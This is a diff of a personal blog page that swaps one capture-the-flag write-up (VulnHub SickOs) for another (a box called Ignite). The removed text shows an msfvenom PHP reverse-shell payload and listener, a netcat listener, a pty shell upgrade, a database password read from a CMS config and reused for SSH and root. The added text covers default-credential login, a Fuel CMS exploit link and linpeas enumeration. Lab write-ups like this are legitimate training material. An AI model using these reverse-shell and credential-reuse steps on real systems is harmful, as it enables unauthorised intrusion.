@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>CTF_SickOs | Peanutstick</title>
+  <title>CTF Ignite | Peanutstick</title>
   <meta name="keywords" content=" Linux ">
-  <meta name="description" content="CTF_SickOs | Peanutstick">
+  <meta name="description" content="CTF Ignite | Peanutstick">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="rustscan GObustergobuster dir -u http:&#x2F;&#x2F;10.10.219.98 -x txt,html,php -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt Not interesting. Robots.txtIt’s the login page of the CMSThe config">
 <meta property="og:type" content="article">
@@ -1105,9 +1105,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-CTF_SickOs" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-Ignite" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">CTF_SickOs</h1>
+        <h1 class="article-title">CTF Ignite</h1>
     
     <div class="article-meta">
         
@@ -1132,12 +1132,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2022-09-27 09:49:10'>2022-01-09 01:15</time>
+            Created At : <time class="date" title='Updated At: 2023-01-29 11:33:10'>2023-01-29 18:20</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:623</span>
+        <span>Count:129</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -1156,7 +1156,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Discovery"><span class="toc-text">Discovery</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Description"><span class="toc-text">Description</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Scanning"><span class="toc-text">Scanning</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#netdiscover"><span class="toc-text">netdiscover</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap"><span class="toc-text">nmap</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploit"><span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Use-the-proxy"><span class="toc-text">Use the proxy</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gobuster"><span class="toc-text">gobuster</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#metasploit"><span class="toc-text">metasploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse-shell"><span class="toc-text">Reverse shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Recon"><span class="toc-text">Recon</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#rustscan"><span class="toc-text">rustscan</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GObuster"><span class="toc-text">GObuster</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Robots-txt"><span class="toc-text">Robots.txt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User-password-of-the-login-page"><span class="toc-text">User password of the login page</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#revershell"><span class="toc-text">revershell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Enum-with-linpeas"><span class="toc-text">Enum with linpeas</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE"><span class="toc-text">CVE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Password-in-config-file"><span class="toc-text">Password in config file</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1172,69 +1172,23 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="Discovery"><a href="#Discovery" class="headerlink" title="Discovery"></a>Discovery</h1><p>[<a href="https://www.vulnhub.com/entry/sickos-11,132/]">https://www.vulnhub.com/entry/sickos-11,132/]</a></p>
-<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>This CTF gives a clear analogy how hacking strategies can be performed on a network to compromise it in a safe environment.<br>This vm is very similar to labs I faced in OSCP.<br>The objective being to compromise the network/machine and gain Administrative/root privileges on them.</p>
-<p>Objective…: Get /root/a0216ea4d51874464078c618298b1367.txt</p>
-<h1 id="Scanning"><a href="#Scanning" class="headerlink" title="Scanning"></a>Scanning</h1><h2 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a>netdiscover</h2><p>sudo netdiscover</p>
-<p><img src="https://i.imgur.com/yo8M1tX.png"></p>
-<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p><img src="https://i.imgur.com/EjsxJkm.png"></p>
-<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>http-proxy Squid http proxy 3.1.19</p>
-<p>[<a href="https://www.exploit-db.com/exploits/9951]">https://www.exploit-db.com/exploits/9951]</a><br>Let’s use Metasploit.</p>
-<pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">sudo msfconsole
-search squid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://i.imgur.com/w2MXcME.png"></p>
-<h4 id="Use-the-proxy"><a href="#Use-the-proxy" class="headerlink" title="Use the proxy"></a>Use the proxy</h4><p>I dont set the proxy in my browser because I want to try the dirbuster.</p>
-<pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">export http_proxy&#x3D;&#39;http:&#x2F;&#x2F;192.168.0.26:3128&#39;
-curl http:&#x2F;&#x2F;192.168.0.26   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h4 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h4><pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">gobuster dir -x * -u http:&#x2F;&#x2F;192.168.0.26 -w Documents&#x2F;wordlist&#x2F;directory-list-2.3-medium.txt <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://i.imgur.com/ZGAblDU.png"><br>/index                (Status: 200) [Size: 21]<br>/connect              (Status: 200) [Size: 109]<br>/robots               (Status: 200) [Size: 45]<br>/server-status        (Status: 403) [Size: 293]</p>
-<p>connect is a python file</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">1</span> <span class="token comment">#!/usr/bin/python</span>
-<span class="token number">2</span> 
-<span class="token number">3</span> <span class="token keyword">print</span> <span class="token string">"I Try to connect things very frequently\n"</span>
-<span class="token number">4</span> <span class="token keyword">print</span> <span class="token string">"You may want to try my services"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p>I don’t know what to do with it.</p>
-<p>In robots.txt</p>
-<pre class="line-numbers language-none"><code class="language-none">User-agent: *
-Disallow: &#x2F;
-Dissalow: &#x2F;wolfcms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>Let’s see what is wolfcms and see if we can exploit it.<br><img src="https://i.imgur.com/zGLfr3c.png"><br><a href="https://www.exploit-db.com/exploits/38000">https://www.exploit-db.com/exploits/38000</a></p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.0.26&#x2F;wolfcms&#x2F;?&#x2F;admin&#x2F;plugin&#x2F;file_manager&#x2F;browse&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>Now we have a login page, let’s try with admin/admin.<br><img src="https://i.kym-cdn.com/photos/images/facebook/001/379/666/feb.jpg"><br><img src="https://i.imgur.com/4Tgdowv.png"></p>
-<h2 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h2><p>I’m gonna upload a revers shell, usualy I use thoses from pentestmonkey with netcat, but this time I’m gonna use metasploit.</p>
-<pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.0.21 LPORT&#x3D;4444 -f raw -o shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>And upload the shell.php in the website.</p>
-<p>Run msfconsole to start the listener:</p>
-<pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">use exploit&#x2F;multi&#x2F;handler 
-set LHOST &lt;$LOCAL_IP&gt;
-set LPORT &lt;$LOCAL_PORT&gt;
-set PAYLOAD php&#x2F;meterpreter&#x2F;reverse_tcp 
-exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://i.imgur.com/hQGt9Ad.png"><br><img src="https://i.imgur.com/CEY9ICE.png"><br>I don’t know where is my error, I just want a shell so bye bye metasploit.</p>
-<h2 id="Reverse-shell"><a href="#Reverse-shell" class="headerlink" title="Reverse shell"></a>Reverse shell</h2><p>I’m gonna download the reverse shell from pentestmonkey.<br>[<a href="https://github.com/pentestmonkey/php-reverse-shell]">https://github.com/pentestmonkey/php-reverse-shell]</a><br>And change the values.<br><img src="https://i.imgur.com/SDx3wz7.png"><br>you can also replace the shell.<br>[<a href="https://netsec.ws/?p=337%5D">https://netsec.ws/?p=337]</a></p>
-<p>Upload the shell and listen with netcat.</p>
-<pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">netcat -nlvp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://i.imgur.com/xyldqe4.png"></p>
-<p>let’s upgrade the shell with this.</p>
-<pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><p>Let’s upload the LinEnum script and run it.<br><img src="https://i.imgur.com/gtZDQ0a.png"><br>I want to create a txt file because it’s hard to read.<br><img src="https://i.imgur.com/Upnc7Ed.png"><br>It’s too hard to read I’m gonna find something else.<br>[<a href="https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh]">https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh]</a><br>I like this one, there is lot of colors.<br>I think I foud it.<br><img src="https://i.imgur.com/PLiZAJV.png"><br>We can edit connect.py to open a revershell with an another port,<br>and listen with netcat<br>It’s not working, let’s see more informations.<br><img src="https://i.imgur.com/qnNZ3ve.png"><br>Ok this file is not for now, I think I have to find the user first, not the root.</p>
-<pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">cat &#x2F;var&#x2F;www&#x2F;wolfcms&#x2F;config.php
-
-&#x2F;&#x2F; Database settings:
-define(&#39;DB_DSN&#39;, &#39;mysql:dbname&#x3D;wolf;host&#x3D;localhost;port&#x3D;3306&#39;);
-define(&#39;DB_USER&#39;, &#39;root&#39;);
-define(&#39;DB_PASS&#39;, &#39;john@123&#39;);
-define(&#39;TABLE_PREFIX&#39;, &#39;&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>The user is not working for root, but for sickos it’s good.</p>
-<pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">ssh sickos@192.168.0.26
-john@123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>Now I’m gonna run the enumeration script with the user sickOS</p>
-<p><img src="https://i.imgur.com/nM0aAHv.png"></p>
-<pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">sudo su<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>I’m root.<br><img src="https://i.imgur.com/tdk9zei.png"></p>
-<p>)</p>
+        <h1 id="rustscan"><a href="#rustscan" class="headerlink" title="rustscan"></a>rustscan</h1><p><img src="https://i.imgur.com/TE0Z10V.png"></p>
+<h1 id="GObuster"><a href="#GObuster" class="headerlink" title="GObuster"></a>GObuster</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> -u http://10.10.219.98 -x txt,html,php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.imgur.com/icJH2zg.png"><br>Not interesting.</p>
+<h2 id="Robots-txt"><a href="#Robots-txt" class="headerlink" title="Robots.txt"></a>Robots.txt</h2><p><img src="https://i.imgur.com/5CEeKW1.png"><br>It’s the login page of the CMS<br><img src="https://i.imgur.com/spgugwz.png"><br>The config file is here:<br><img src="https://i.imgur.com/OtbUlmt.png"></p>
+<h2 id="User-password-of-the-login-page"><a href="#User-password-of-the-login-page" class="headerlink" title="User password of the login page"></a>User password of the login page</h2><p><img src="https://i.imgur.com/objDweu.png"><br>So if I user admin:admin in the login page it’s working.<br><img src="https://i.imgur.com/djVcwFz.png"><br>Useless, let’s searsh for an exploit.</p>
+<h1 id="revershell"><a href="#revershell" class="headerlink" title="revershell"></a>revershell</h1><p><a href="https://github.com/AssassinUKG/fuleCMS">https://github.com/AssassinUKG/fuleCMS</a></p>
+<p><img src="https://i.imgur.com/9HkZc0v.png"></p>
+<p>Upgrade my shell:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python -c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h1 id="Enum-with-linpeas"><a href="#Enum-with-linpeas" class="headerlink" title="Enum with linpeas"></a>Enum with linpeas</h1><p>My computer:<br><img src="https://i.imgur.com/Wh5p4Ei.png"><br>Target:<br><img src="https://i.imgur.com/LFOAFLb.png"><br>Then run it.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> +x l*
+./l*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>Linpeas is maybe overkill for this box, lse.sh is good for this kind of box.</p>
+<p><img src="https://i.imgur.com/BqCbRhl.png"></p>
+<p><img src="https://i.imgur.com/DHcGtg4.png"></p>
+<h2 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h2><p><img src="https://i.imgur.com/SWgFJJT.png"><br>Can be root in a sec with this exploit.</p>
+<h2 id="Password-in-config-file"><a href="#Password-in-config-file" class="headerlink" title="Password in config file"></a>Password in config file</h2><p><img src="https://i.imgur.com/C22GKXq.png"><br>Let’s try it on root<br><img src="https://i.imgur.com/KbY7ZQJ.png"><br>The CTF is over.</p>
 
       
        
